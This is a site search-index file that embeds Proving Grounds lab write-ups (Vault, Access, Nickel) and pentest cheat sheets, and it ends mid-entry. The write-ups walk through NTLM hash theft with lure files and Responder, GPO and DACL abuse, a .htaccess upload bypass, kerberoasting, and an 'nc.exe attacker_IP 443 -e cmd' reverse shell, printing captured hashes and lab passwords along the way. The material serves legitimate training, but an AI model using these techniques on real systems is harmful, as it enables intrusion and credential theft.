var relearn_searchindex = [
  {
    "breadcrumb": "",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Dragonfly Commando",
    "uri": "/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Writeup \u003e Proving Grounds",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Heist",
    "uri": "/writeup/proving-grounds/heist/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Bloodhound",
    "uri": "/tags/bloodhound/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: DACL",
    "uri": "/tags/dacl/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Impacket-Dacledit",
    "uri": "/tags/impacket-dacledit/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Impacket-Owneredit",
    "uri": "/tags/impacket-owneredit/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Ntlm_theft",
    "uri": "/tags/ntlm_theft/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Responder",
    "uri": "/tags/responder/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: SharpGPOAbuse",
    "uri": "/tags/sharpgpoabuse/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tags",
    "uri": "/tags/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Writeup \u003e Proving Grounds",
    "content": "initial foothold nmap PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-02-24 09:18:25Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=DC.vault.offsec | Not valid before: 2026-02-23T09:16:03 |_Not valid after: 2026-08-25T09:16:03 | rdp-ntlm-info: | Target_Name: VAULT | NetBIOS_Domain_Name: VAULT | NetBIOS_Computer_Name: DC | DNS_Domain_Name: vault.offsec | DNS_Computer_Name: DC.vault.offsec | DNS_Tree_Name: vault.offsec | Product_Version: 10.0.17763 |_ System_Time: 2026-02-24T09:19:19+00:00 |_ssl-date: 2026-02-24T09:20:33+00:00; 0s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open unknown 49668/tcp open unknown 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open unknown 49679/tcp open unknown 49703/tcp open unknown I started by checking for guest access on the target machine.\nenumeration SMB I checked that I have a guest access.\ncrackmapexec smb 192.168.115.172 -u 'guest' -p '' --shares SMB 192.168.115.172 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False) SMB 192.168.115.172 445 DC [+] vault.offsec\\guest: SMB 192.168.115.172 445 DC [+] Enumerated shares SMB 192.168.115.172 445 DC Share Permissions Remark SMB 192.168.115.172 445 DC ----- ----------- ------ SMB 192.168.115.172 445 DC ADMIN$ Remote Admin SMB 192.168.115.172 445 DC C$ Default share SMB 192.168.115.172 445 DC DocumentsShare READ,WRITE SMB 192.168.115.172 445 DC IPC$ READ Remote IPC SMB 192.168.115.172 445 DC NETLOGON Logon server share SMB 192.168.115.172 445 DC SYSVOL Logon server share The output confirmed that I have READ/WRITE permissions on the DocumentsShare.\nSince I have write access, I can attempt to capture an NTLM hash by forcing a user to authenticate to my machine.\nI used ntlm-theft to generate a set of malicious files. If a user interacts with any of these files, Responder will capture their hash.\nexploitation Craft the payload. python3 ntlm_theft.py -g all -s 192.168.45.247 -f lure Start Responder sudo responder -I tun0 -v Upload the files. prompt off mput * Shortly after, a connection was triggered, and I captured the NTLMv2 hash for the user anirudh\n[SMB] NTLMv2-SSP Client : 192.168.115.172 [SMB] NTLMv2-SSP Username : VAULT\\anirudh [SMB] NTLMv2-SSP Hash : anirudh::VAULT:40babecc932bb0e4:02EAF46724C05C5D92F5FA10E91CCC7D:010100000000000000715745BEA5DC0193C7B6FF64C22AFD00000000020008004C0039004100450001001E00570049004E002D004700310042003500520051003700440031003200380004003400570049004E002D00470031004200350052005100370044003100320038002E004C003900410045002E004C004F00430041004C00030014004C003900410045002E004C004F00430041004C00050014004C003900410045002E004C004F00430041004C000700080000715745BEA5DC01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200340037000000000000000000 I cracked the captured hash and retrieved the password: SecureHM\nWith these credentials, I gained initial access via evil-winrm:\nevil-winrm -i 192.168.115.172 -u 'anirudh' -p 'SecureHM' Manual methods. You can also do this manually by creating a .url file that points to your attacker IP.\ncat @hax.url [InternetShortcut] URL=anything WorkingDirectory=anything IconFile=\\\\attacker_ip\\%USERNAME%.icon IconIndex=1 privilege escalation Running whoami /priv showed that the user has SeBackupPrivilege. However, after some investigation, this turned out to be a rabbit hole.\nI spent some time on it.\nGPO Abuse via BloodHound Using BloodHound, I discovered that the user anirudh has write permissions over the Default Domain Policy.\nTo escalate privileges, I took ownership of the GPO and modified the DACL using Impacket’s owneredit and dacledit. Then, I used SharpGPOAbuse.exe to add anirudh to the local Administrators group.\nimpacket-owneredit -action write -new-owner 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM' [*] Current owner information below [*] - SID: S-1-5-21-537427935-490066102-1511301751-512 [*] - sAMAccountName: Domain Admins [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=vault,DC=offsec [*] OwnerSid modified successfully! And give all privileges to the user.\nimpacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM' -dc-ip 192.168.115.172 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] DACL backed up to dacledit-20260225-104610.bak [*] DACL modified successfully! The user anirudh is owner of default domain policy.\nWith Powerview, we can confirm the user has permissions on it.\n*Evil-WinRM* PS C:\\Users\\anirudh\u003e Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh Trustee : anirudh TrusteeType : User Permission : GpoEditDeleteModifySecurity Inherited : False Now, let’s modify the policy using SharpGPOAbuse.exe!\n.\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName \"Default Domain Policy\" [+] Domain = vault.offsec [+] Domain Controller = DC.vault.offsec [+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec [+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103 [+] GUID of \"Default Domain Policy\" is: {31B2F340-016D-11D2-945F-00C04FB984F9} [+] File exists: \\\\vault.offsec\\SysVol\\vault.offsec\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf [+] The GPO does not specify any group memberships. [+] versionNumber attribute changed successfully [+] The version number in GPT.ini was increased successfully. [+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle. [+] Done! Now anirudh became administrator!\nAfter successfully modifying the GPO, I forced a policy update.\ngpupdate /force\nWith the policy applied, anirudh was added to the local Administrators group. I logged back in, verified my identity with whoami /groups, and successfully retrieved the root flag from the Administrator’s desktop.",
    "description": "Learn how to escalate privileges in an Active Directory environment by exploiting SMB guest write access and GPO abuse. This walkthrough covers NTLM hash capturing with Responder, ntlm-theft, and leveraging SharpGPOAbuse to gain local admin rights on a Windows Domain Controller.",
    "tags": [
      "Responder",
      "DACL",
      "Bloodhound",
      "Ntlm_theft",
      "SharpGPOAbuse",
      "Impacket-Owneredit",
      "Impacket-Dacledit"
    ],
    "title": "Vault",
    "uri": "/writeup/proving-grounds/vault/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: .Htaccess",
    "uri": "/tags/.htaccess/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Writeup \u003e Proving Grounds",
    "content": "Initial foothold PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7) |_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7 |_http-title: Access The Event | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-02-24 01:27:40Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name) 443/tcp open ssl/http Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7) | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | http-methods: |_ Potentially risky methods: TRACE |_http-title: Access The Event |_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49671/tcp open msrpc Microsoft Windows RPC 49674/tcp open msrpc Microsoft Windows RPC 49679/tcp open msrpc Microsoft Windows RPC 49701/tcp open msrpc Microsoft Windows RPC 49789/tcp open msrpc Microsoft Windows RPC Ports 80 and 443 are open. Let’s start by enumerating the web server.\nEnumeration WEB whatweb http://192.168.115.187/ http://192.168.115.187/ [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], Email[info@example.com], Frame, HTML5, HTTPServer[Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7], IP[192.168.115.187], Lightbox, OpenSSL[1.1.1k], PHP[8.0.7], Script, Title[Access The Event] I checked the versions of the web components, but no known vulnerabilities were found for these specific versions.\nHowever, I confirmed that the site is running on an Apache server and is developed in PHP.\nObserve functionality of the web.\nI found a file upload function on the “Buy Tickets” page.\nThe upload filter can be easily bypassed by changing the extension to xxx.php.gif\nHowever, neither a web shell nor a reverse shell would execute.\nExploitation Since the target is an Apache server, we can upload a .htaccess file to manipulate server configurations.\nFor example, a file type can be added like below.\nAddType application/x-httpd-php .gif By adding this line, gif file extension will be treated as php file.\nwe can even create a new extension.\nAddType application/x-httpd-php .test After uploading the crafted .htaccess file, it remains hidden in the uploads directory, but the configuration takes effect.\nI uploaded a php revshell to the web site again, and this time managed to get a shell as svc_apache user.\nLateral movement No local.txt flag in svc_apache users’ desktop folder.\nTried kerberoast using rubeus and found other credential.\nrubeus.exe kerberoast /nowrap Rubeus is highly effective for gathering credentials when you have initial access to a target system without cleartext passwords.\n[*] SamAccountName : svc_mssql [*] DistinguishedName : CN=MSSQL,CN=Users,DC=access,DC=offsec [*] ServicePrincipalName : MSSQLSvc/DC.access.offsec [*] PwdLastSet : 5/21/2022 5:33:45 AM [*] Supported ETypes : RC4_HMAC_DEFAULT [*] Hash : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$47E98E66E07AE25B066B0D0CCAD15639$87C81FBB98E7F02BBA8AEE760A539F86EFD5B7460DFB9A740109435E935C1577009E8E712A2101CCE112C55AC8EC10F2A12B4DA839ECC8139D05195AA3AE7C91E7B5289759E056CB89F818BF57742A477BA77987ED7EF563C2E4BBDF14D9406A0449ECC330CA4396D9969190F5C84D93359EDEB2FBDD3CFC0B869DBC3877136501E0CB4BAB7A728F3247EB765DD41BCEC9E62F9961CDF1079E0C475BB71F4EB2A68CB8DFAFC5C1E0ACCEEBEBE99051E5957703A24FAD37C3DBD635EFF8722602F9DAB167C61543475E558D7FCD56DA172D7881CECC6854CE755A97916A0DFF98DFA2929AF5E10BA8DC0EB25824CFCA5D7B1B05CCA5D4DBB5AB8FA445220C9A4854F39873E7F497E9CEB824CDF4AF8B47550EB2B134517352B250F5D17CBECEB0E819811B15823BF301DF3B5F675027780FF2C148E2C54923C5A60B2916E6D0BD8070019860C67F8BA68A6FC357359DD2B47790F139DEB801B1F258ECFFE2BC96C3E68833E87D3E29FA956F4BCBB367B04EB43AF6C6FD4C3A6A7A9392594131D738833BCF3E372B516C89C59A0721C0EB7B1CAB03A5677AB2F96E7463E35393B9C995ABE8B85DFCFAD84F67A0B8F2A7033C66D49C0C2EB40E3726C9CEEEEA297F68077B511E194EA7881A2A3B62875E53C508FB48E54FAE67BDB95DA83F75D2E061E260B845E93C2472989A4D512030445CD5C9A896367F59900B78A187205AF9159430A0FDC2F07706B3D6D49F25EF980B9B6CB9CD42E28EFCDB10170EE89940E2996C4DBAC066A5A7D41564AB4DF7B134709BFC96C1D80FBB07FC7993616925C3DDCEA964ECB18E887BA0C2CAC30AE8903FCF9D2DDD8B3E382C0362D358CB33624BDB583C4C6363BB0A7CB04713F9B42AB29C197FCE31B945BDB1231549A6B9206A4AF05B37EB02BF33501084583DAEEA269A21C7E4328E2D488E52590B2BAC2C3E28F70E8E7EA2C65A9C704BCB416C007F823D66B4E1B669CC8CF25AE8F9A1B4FAF004F3C3D80BFA4A2BE5E891CC9BCE645ECC22B135827FC073FDB6E4353DDDD049BDC41DF5A70CD4EF3BA84B3DB4991753B107F346B6ED83FBFDC0950483F95C4AD6F021AE499A8CA1CE2445632844D566FDF7D7513E8E85167CC4CBFAE0F21C8EE7C772E1A742EB0C68D9AD12A064334BAB8FB4FF48BF5CAB6CC4B9DEE9F540C2832125E505D6AB45301E3970D23015812395681A80F8E43D8E1A404E963B9EC32C5BE357EC5DD480998ED8A1018E0DD0AF8B5B446C2920DF7691781B8AD5BCFCC4BF1D9C8D2A50418F140F8B29B10AEFF762A8FFEDC86F19D69A5EBC28D7A451FBEBAE79F50BBF3C09F07D42D4F267091DA4574FB86664A6CCBC10C6B3A6DEEC00FE28B7E229440A5B30008B8349FC953E5FADC0556AEDE06449BB87C275CF9D2C0C05EDFCD12686B516136D921C132E3E64067B58FFCDD9ED3F71EAFC10151C2EA93B4C2D11E0709B1DD994E339056BCED25906EBACAF271A5BC48BD0F7D50EEBB9A2AECB685C376F099D60E6862B7B5696D1A41567DC6FE66254EB1132D5BD5B9BC3BD0331CC5542982194EFBFD4D77CBD5496284B56E7147E21ED33C9E5BCD5C904DBADCFB3620A9237DE3FAE8B After cracking the captured hash, I obtained the password: trustno1\nI used the RunsasCs to spawn a shell as the svc_mssql user.\nRunasCs.exe svc_mssql trustno1 \"cmd /c C:/Users/public/nc.exe attacker_IP 443 -e cmd\" -t 0 Execute a reverse shell command as user svc_mssql\nC:\\Windows\\system32\u003ewhoami whoami access\\svc_mssql Privilege Escalation Check svc_mssql’s priviliege.\nPRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ================================ ======== SeMachineAccountPrivilege Add workstations to domain Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeManageVolumePrivilege Perform volume maintenance tasks Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled The SeManageVolumePrivilege is a well-known privilege escalation vector.\nSimply running the tool SeManageVolumeExploit, svc_mssql can access all resources like administrator.\nFor further information gathering, you may transfer sensitive files such as SAM, SYSTEM from system32 folder.",
    "description": "An attacker achieve initial access by uploading crafted files. After getting the initial shell, other credentials found using kerberoast attack. Finally, An attacker can escalage privilege bu exploiting SeManageVolumePrivilege.",
    "tags": [
      ".Htaccess",
      "RunasCs",
      "SeManageVolumePrivilege"
    ],
    "title": "Access",
    "uri": "/writeup/proving-grounds/access/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: RunasCs",
    "uri": "/tags/runascs/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: SeManageVolumePrivilege",
    "uri": "/tags/semanagevolumeprivilege/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "Cheat Sheets \u0026 Tips",
    "description": "Cheat Sheets \u0026 Tips",
    "tags": [],
    "title": "Posts",
    "uri": "/posts/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Writeup",
    "content": "Offsec’s proving grounds writeups.",
    "description": "Offsec’s proving grounds writeups.",
    "tags": [],
    "title": "Proving Grounds",
    "uri": "/writeup/proving-grounds/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Nickel",
    "uri": "/tags/nickel/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Writeup \u003e Proving Grounds",
    "content": "Initial foothold Nmap scan PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd 0.9.60 beta | ftp-syst: |_ SYST: UNIX emulated by FileZilla 22/tcp open ssh OpenSSH for_Windows_8.1 (protocol 2.0) | ssh-hostkey: | 3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA) | 256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA) |_ 256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: NICKEL | NetBIOS_Domain_Name: NICKEL | NetBIOS_Computer_Name: NICKEL | DNS_Domain_Name: nickel | DNS_Computer_Name: nickel | Product_Version: 10.0.18362 |_ System_Time: 2026-02-23T09:53:02+00:00 |_ssl-date: 2026-02-23T09:54:08+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=nickel | Not valid before: 2025-12-06T11:11:21 |_Not valid after: 2026-06-07T11:11:21 5040/tcp open unknown 7680/tcp open pando-pub? 8089/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn't have a title. 33333/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn't have a title. 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC The scan reveals several open ports, including FTP, SSH, SMB, and multiple HTTP services. I will begin by enumerating these services.\nEnumeration WEB Accessing the web service on port 8089 reveals the following home page:\nThe page contains three buttons. Reviewing the source code shows that these links redirect to endpoints on port 33333.\nlist-current-deployments list-running-procs list-active-nodes I attempted to interact with the /list-active-nodes endpoint on port 33333 using curl:\ncurl -XPOST http://192.168.168.99:33333/list-active-nodes -H \"Content-Type:application/www-form-urlencoded\" \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\"http://www.w3.org/TR/html4/strict.dtd\"\u003e \u003cHTML\u003e\u003cHEAD\u003e\u003cTITLE\u003eLength Required\u003c/TITLE\u003e \u003cMETA HTTP-EQUIV=\"Content-Type\" Content=\"text/html; charset=us-ascii\"\u003e\u003c/HEAD\u003e \u003cBODY\u003e\u003ch2\u003eLength Required\u003c/h2\u003e \u003chr\u003e\u003cp\u003eHTTP Error 411. The request must be chunked or have a content length.\u003c/p\u003e \u003c/BODY\u003e\u003c/HTML\u003e The server responded with an HTTP 411 Length Required error. To resolve this, I added a Content-Length header and re-submitted the request:\ncurl -XPOST http://192.168.168.99:33333/list-active-nodes -H \"Content-Type:application/www-form-urlencoded\" -H \"Content-Length:6\" \u003cp\u003eNot Implemented\u003c/p\u003e The request was successful, returning a “Not Implemented” message. I proceeded to test the other endpoints.\ncurl -XPOST http://192.168.168.99:33333/list-running-procs -H \"Content-Type:application/www-form-urlencoded\" -H \"Content-Length:6\" name : System Idle Process commandline : name : System commandline : name : Registry commandline : name : smss.exe commandline : name : csrss.exe commandline : name : wininit.exe commandline : name : csrss.exe commandline : name : winlogon.exe commandline : winlogon.exe name : services.exe commandline : name : lsass.exe commandline : C:\\Windows\\system32\\lsass.exe name : fontdrvhost.exe commandline : \"fontdrvhost.exe\" name : fontdrvhost.exe commandline : \"fontdrvhost.exe\" name : dwm.exe commandline : \"dwm.exe\" name : powershell.exe commandline : powershell.exe -nop -ep bypass C:\\windows\\system32\\ws80.ps1 name : Memory Compression commandline : name : cmd.exe commandline : cmd.exe C:\\windows\\system32\\DevTasks.exe --deploy C:\\work\\dev.yaml --user ariah -p \"Tm93aXNlU2xvb3BUaGVvcnkxMzkK\" --server nickel-dev --protocol ssh name : powershell.exe commandline : powershell.exe -nop -ep bypass C:\\windows\\system32\\ws8089.ps1 name : powershell.exe commandline : powershell.exe -nop -ep bypass C:\\windows\\system32\\ws33333.ps1 name : FileZilla Server.exe commandline : \"C:\\Program Files (x86)\\FileZilla Server\\FileZilla Server.exe\" name : sshd.exe commandline : \"C:\\Program Files\\OpenSSH\\OpenSSH-Win64\\sshd.exe\" name : VGAuthService.exe commandline : \"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe\" name : vm3dservice.exe commandline : C:\\Windows\\system32\\vm3dservice.exe name : vmtoolsd.exe commandline : \"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" name : vm3dservice.exe commandline : vm3dservice.exe -n name : dllhost.exe commandline : C:\\Windows\\system32\\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235} name : WmiPrvSE.exe commandline : C:\\Windows\\system32\\wbem\\wmiprvse.exe name : msdtc.exe commandline : C:\\Windows\\System32\\msdtc.exe name : LogonUI.exe commandline : \"LogonUI.exe\" /flags:0x2 /state0:0xa3961855 /state1:0x41c64e6d name : conhost.exe commandline : \\??\\C:\\Windows\\system32\\conhost.exe 0x4 name : conhost.exe commandline : \\??\\C:\\Windows\\system32\\conhost.exe 0x4 name : conhost.exe commandline : \\??\\C:\\Windows\\system32\\conhost.exe 0x4 name : conhost.exe commandline : \\??\\C:\\Windows\\system32\\conhost.exe 0x4 name : WmiPrvSE.exe commandline : C:\\Windows\\system32\\wbem\\wmiprvse.exe name : MicrosoftEdgeUpdate.exe commandline : \"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /c name : SgrmBroker.exe commandline : name : SearchIndexer.exe commandline : C:\\Windows\\system32\\SearchIndexer.exe /Embedding While reviewing the running processes, I discovered a potential credential for SSH within a command line:\ncmd.exe C:\\windows\\system32\\DevTasks.exe --deploy C:\\work\\dev.yaml --user ariah -p \"Tm93aXNlU2xvb3BUaGVvcnkxMzkK\" --server nickel-dev --protocol ssh\nSSH connection Tm93aXNlU2xvb3BUaGVvcnkxMzkK is base64 decoded password.\necho Tm93aXNlU2xvb3BUaGVvcnkxMzkK | base64 -d NowiseSloopTheory139 ssh ariah@targetIP Using these credentials, I successfully established an SSH connection as the user ariah:\nPrivesc Upon checking the FTP directory, I found a PDF file. Since the file was password-protected, I used pdf2john to extract the hash and cracked it with john:\npdf2john infrastructure.pdf \u003e hash john hash --wordlist=/usr/share/wordlists/rockyou.txt ariah4168 The PDF contains a note regarding three sites and mentions a command endpoint.\nThis endpoint allows command execution. I can access this locally via curl from my existing session or set up port forwarding to access it from my Kali machine.\nariah@NICKEL C:\\Users\\ariah\u003ecurl http://127.0.0.1/?whoami \u003c!doctype html\u003e\u003chtml\u003e\u003cbody\u003edev-api started at 2025-12-07T05:47:35 \u003cpre\u003ent authority\\system \u003c/pre\u003e \u003c/body\u003e\u003c/html\u003e Alternatively, using SSH port forwarding:\nariah@NICKEL C:\\Users\u003essh -N -R 80:127.0.0.1:80 kali@IP The output confirms the API is running as nt authority\\system.\nBy sending a URL-encoded command, I can read the proof.txt file or execute a reverse shell payload to gain full system access.",
    "description": "proving grounds nickel writeup",
    "tags": [
      "Port-Forwarding",
      "Nickel",
      "Writeup"
    ],
    "title": "Nickel",
    "uri": "/writeup/proving-grounds/nickel/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Port-Forwarding",
    "uri": "/tags/port-forwarding/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Writeup",
    "uri": "/tags/writeup/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Ligolo",
    "uri": "/tags/ligolo/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Posts",
    "content": "ligolo-ng Set a proxy server sudo ./proxy -selfcert -laddr \"0.0.0.0:7878\"\nCreate an interface interface_create --name \"evil-cha\"\nAdd route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24\nAccess to the proxy server from the target machine ./agent -connect 10.10.14.3:11601 -ignore-cert\nCheck sessions from the proxy sessoins\nStart tunneling tunnel_start --tun evil-cha\nFor local port forwarding.\nfrom kali terminal sudo ip route add 240.0.0.1/32 dev evil-cha\nor\nfrom ligolo proxy interface interface_add_route --name evil-cha --route 240.0.0.1/32",
    "description": "ligolo-ng Set a proxy server sudo ./proxy -selfcert -laddr \"0.0.0.0:7878\"\nCreate an interface interface_create --name \"evil-cha\"\nAdd route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24\nAccess to the proxy server from the target machine ./agent -connect 10.10.14.3:11601 -ignore-cert\nCheck sessions from the proxy sessoins\nStart tunneling tunnel_start --tun evil-cha\nFor local port forwarding.\nfrom kali terminal sudo ip route add 240.0.0.1/32 dev evil-cha",
    "tags": [
      "Ligolo"
    ],
    "title": "Pivoting",
    "uri": "/posts/pivoting/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Posts",
    "content": "SMB set up SMB server on kali\nimpacket-smbserver test . -smb2support -user user -password 1234\nConnect to the SMB from windows\nnet use Z: \\\\192.168.45.211\\test /user:user 1234\nnc linux file receiver\nnc -lp 1234 \u003e file.txt\nfile sender\nnc -q 0 192.168.45.211 1234 \u003c file.txt\nwindows file receiver\nnc -lp 1234 \u003e file.txt\nfile sender\nnc.exe -w 1 192.168.45.211 1234 \u003c file.txt",
    "description": "SMB set up SMB server on kali\nimpacket-smbserver test . -smb2support -user user -password 1234\nConnect to the SMB from windows\nnet use Z: \\\\192.168.45.211\\test /user:user 1234\nnc linux file receiver",
    "tags": [
      "Smbserver",
      "Nc"
    ],
    "title": "File Transfer",
    "uri": "/posts/file-transfer/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Nc",
    "uri": "/tags/nc/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Smbserver",
    "uri": "/tags/smbserver/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "Choose a category from the side menu!",
    "description": "Choose a category from the side menu!",
    "tags": [],
    "title": "Writeup",
    "uri": "/writeup/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Reverseshell",
    "uri": "/tags/reverseshell/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Posts",
